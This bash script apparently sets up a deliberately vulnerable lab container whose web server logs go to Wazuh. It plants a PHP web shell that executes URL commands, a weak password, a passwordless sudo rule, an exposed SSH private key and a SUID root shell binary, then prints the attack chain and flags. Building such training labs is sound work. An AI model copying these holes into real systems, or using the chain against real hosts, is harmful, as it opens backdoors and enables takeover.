#!/bin/bash
set -e

# APTL Vulnerable Victim Setup Script
# Sets up web server with command execution, user accounts, flags, and privilege escalation paths

CONTAINER_NAME="aptl-victim"

echo "=== APTL Vulnerable Victim Setup ==="
echo "Target container: $CONTAINER_NAME"
echo ""

# Check if container exists and remove it
if docker ps -a --format '{{.Names}}' | grep -q "^${CONTAINER_NAME}$"; then
    echo "🔄 Removing existing container..."
    docker stop "$CONTAINER_NAME" >/dev/null 2>&1
    docker rm "$CONTAINER_NAME" >/dev/null 2>&1
    echo "✅ Old container removed"
fi

# Recreate the container
echo "🔄 Creating fresh container..."
cd "$(dirname "$0")/.." || exit 1
if ! docker compose --profile wazuh --profile victim up -d victim >/dev/null 2>&1; then
    echo "❌ Error: Failed to create container"
    echo "   Make sure Wazuh services are running: ./start-lab.sh"
    exit 1
fi

echo "✅ Fresh container created"
echo "⏳ Waiting for container to be ready..."
sleep 5

# Verify container is running
if ! docker ps --format '{{.Names}}' | grep -q "^${CONTAINER_NAME}$"; then
    echo "❌ Error: Container failed to start"
    exit 1
fi

echo "✅ Container is ready"
echo ""

# Run the setup inside the container
echo "Installing packages and setting up web server..."
docker exec "$CONTAINER_NAME" bash -c '
# Install Apache (httpd), PHP, sudo, and gcc
dnf install -y httpd php sudo gcc >/dev/null 2>&1

# Create web root if needed
mkdir -p /var/www/html

# Create vulnerable PHP web application with command execution
cat > /var/www/html/cmd.php << "WEBEOF"
<?php
if(isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
} else {
    echo "<h2>Command Executor</h2>";
    echo "<p>Usage: ?cmd=your_command</p>";
}
?>
WEBEOF

# Create a simple index page
cat > /var/www/html/index.html << "HTMLEOF"
<!DOCTYPE html>
<html>
<head><title>Victim Web Server</title></head>
<body>
<h1>Welcome to the Victim Server</h1>
<p><a href="/cmd.php">Admin Panel</a></p>
</body>
</html>
HTMLEOF

# Set proper permissions for Apache user
chown -R apache:apache /var/www/html
chmod 644 /var/www/html/cmd.php /var/www/html/index.html

# Start Apache
systemctl start httpd 2>/dev/null || /usr/sbin/httpd -D FOREGROUND &
sleep 2

echo "✅ Web server configured and started"
' 2>&1 | grep "✅"

echo "Configuring log forwarding to Wazuh..."
docker exec "$CONTAINER_NAME" bash -c '
if [ -d /var/ossec ]; then
    # Only add if not already configured
    if ! grep -q "httpd/access_log" /var/ossec/etc/ossec.conf; then
        # Remove closing tag, append config, re-add closing tag
        sed -i "s|</ossec_config>||" /var/ossec/etc/ossec.conf
        cat >> /var/ossec/etc/ossec.conf << "WAZUHEOF"
  <localfile>
    <log_format>apache</log_format>
    <location>/var/log/httpd/access_log</location>
  </localfile>

  <localfile>
    <log_format>apache</log_format>
    <location>/var/log/httpd/error_log</location>
  </localfile>

</ossec_config>
WAZUHEOF
    fi
    /var/ossec/bin/wazuh-control restart >/dev/null 2>&1
    echo "✅ Log forwarding configured"
else
    echo "⚠️  Wazuh agent not installed, skipping log forwarding"
fi
' 2>&1 | grep -E "✅|⚠️"

echo "Creating user accounts and flags..."
docker exec "$CONTAINER_NAME" bash -c '
# Create user "john" if not exists
if ! id john >/dev/null 2>&1; then
    useradd -m -s /bin/bash john
    echo "john:password123" | chpasswd
fi

# Create local.txt flag in john home directory
echo "flag{user_compromised_web_to_john}" > /home/john/local.txt
chown john:john /home/john/local.txt
chmod 600 /home/john/local.txt

# Create root.txt flag
echo "flag{root_access_achieved}" > /root/root.txt
chmod 600 /root/root.txt

echo "✅ User john created with flags"
' 2>&1 | grep "✅"

echo "Setting up privilege escalation paths..."
docker exec "$CONTAINER_NAME" bash -c '
# Create vulnerable SUID binary for priv esc from john to root
cat > /tmp/vulnerable_binary.c << "CEOF"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
CEOF

# Compile the vulnerable binary
gcc /tmp/vulnerable_binary.c -o /usr/local/bin/backup 2>/dev/null
chown root:root /usr/local/bin/backup
chmod 4755 /usr/local/bin/backup
rm -f /tmp/vulnerable_binary.c

# Create sudoers rule for apache to run commands as john
echo "apache ALL=(john) NOPASSWD: /bin/bash" > /etc/sudoers.d/apache_john
chmod 440 /etc/sudoers.d/apache_john

# Create hint file in webroot
cat > /var/www/html/note.txt << "NOTEEOF"
TODO: Remember to remove sudo access for apache user to run as john!
The sysadmin left this enabled for testing...
Command: sudo -u john /bin/bash
NOTEEOF
chown apache:apache /var/www/html/note.txt

# Set up SSH key for john (alternative path)
mkdir -p /home/john/.ssh
if [ ! -f /home/john/.ssh/id_rsa ]; then
    ssh-keygen -t rsa -f /home/john/.ssh/id_rsa -N "" -q
    cat /home/john/.ssh/id_rsa.pub > /home/john/.ssh/authorized_keys
    chmod 700 /home/john/.ssh
    chmod 600 /home/john/.ssh/authorized_keys
    chmod 644 /home/john/.ssh/id_rsa.pub
    chown -R john:john /home/john/.ssh
fi

# Leave backup of private key in "hidden" location
mkdir -p /var/backups/.old
cp /home/john/.ssh/id_rsa /var/backups/.old/john_ssh_key
chmod 644 /var/backups/.old/john_ssh_key

echo "✅ Privilege escalation paths configured"
' 2>&1 | grep "✅"

echo ""
echo "=== Setup Complete ==="
echo ""
echo "📍 Access Information:"
echo "   Web Server (from Kali): http://172.20.0.20/"
echo "   Command Execution:      http://172.20.0.20/cmd.php?cmd=<command>"
echo "   Hint File:              http://172.20.0.20/note.txt"
echo ""
echo "🎯 Attack Chain:"
echo "   1. Web Shell (apache user)"
echo "      → Access: http://172.20.0.20/cmd.php?cmd=id"
echo ""
echo "   2. Escalate to user 'john'"
echo "      → Method 1: sudo -u john /bin/bash (no password)"
echo "      → Method 2: SSH key at /var/backups/.old/john_ssh_key"
echo "      → Credentials: john:password123"
echo ""
echo "   3. Escalate to root"
echo "      → SUID binary: /usr/local/bin/backup"
echo ""
echo "🚩 Flags:"
echo "   local.txt: /home/john/local.txt"
echo "   root.txt:  /root/root.txt"
echo ""
echo "💡 Test from Kali:"
echo "   ssh -i ~/.ssh/aptl_lab_key kali@localhost -p 2023"
echo "   curl \"http://172.20.0.20/cmd.php?cmd=id\""
echo ""
